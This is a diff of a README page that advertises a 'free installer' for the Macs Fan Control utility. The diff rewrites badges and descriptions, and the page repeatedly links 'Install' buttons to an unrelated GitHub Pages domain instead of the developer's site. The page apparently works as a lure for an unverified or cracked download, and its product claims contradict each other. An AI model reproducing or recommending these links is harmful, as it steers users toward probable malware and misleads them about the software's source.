@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-System+Monitor-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Fan+Control-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Macs Fan Control Free Installer** — Macs Fan Control is a free macOS utility that lets you manually control Mac fan speeds to prevent overheating or reduce noise. Works without internet access, no account required. Full offline installation.
+**💻 Macs Fan Control Free Installer** — Macs Fan Control is a macOS and Windows application that gives users manual control over Mac computer fan speeds. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Macs Fan Control](https://img.shields.io/badge/⬇_Install_Macs%20Fan%20Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Macs Fan Control](https://img.shields.io/badge/⬇_Install_Macs+Fan+Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Macs Fan Control
 
-Macs Fan Control is a free macOS utility that lets you manually control Mac fan speeds to prevent overheating or reduce noise. It displays temperature sensors from every component and allows custom automatic fan curves based on any sensor reading.
+Macs Fan Control is a macOS and Windows application that gives users manual control over Mac computer fan speeds. Override Apple's automatic fan control to keep your Mac cooler during intensive workloads, or reduce noise during light use. View all sensor temperatures and fan RPMs in real time. Particularly useful for older Macs with aggressive thermal throttling or inadequate cooling.
 
 ---
 
 ## ❌ Problem: Macs Fan Control is hard to access
 
-- **macOS Only** — Windows version exists but is less featured
-- **Apple Silicon Limitations** — Some fan control features restricted on M-series Macs by Apple
-- **Risk of Overheating** — Manually reducing fan speeds can cause thermal throttling or damage
-- **Sensor Accuracy** — Some Mac models have limited temperature sensor access
+- **Mac Hardware Focus** — Designed for Mac hardware fan control; Windows version limited
+- **Risk of Overheating** — Manual fan speed reduction can cause CPU/GPU thermal throttling or damage
+- **Fan Hardware Dependency** — Only works with Macs that have controllable fans; M-chip Macs differ
+- **Commercial License** — Pro features require paid upgrade
 
 ---
 
@@ -81,7 +81,7 @@ Macs Fan Control is a free macOS utility that lets you manually control Mac fan 
 
 <div align="center">
 
-[![⬇ Install Macs Fan Control](https://img.shields.io/badge/⬇_Install_Macs%20Fan%20Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Macs Fan Control](https://img.shields.io/badge/⬇_Install_Macs+Fan+Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Macs Fan Control is a free macOS utility that lets you manually control Mac fan 
 
 ---
 
-**Macs Fan Control Free Installer** — Macs Fan Control is a free macOS utility that lets you manually control Mac fan speeds to prevent overheating or reduce noise. Install without internet connection today!
+**Macs Fan Control Free Installer** — Macs Fan Control is a macOS and Windows application that gives users manual control over Mac computer fan speeds. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Macs Fan Control](https://img.shields.io/badge/⬇_Install_Macs%20Fan%20Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Macs Fan Control](https://img.shields.io/badge/⬇_Install_Macs+Fan+Control-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
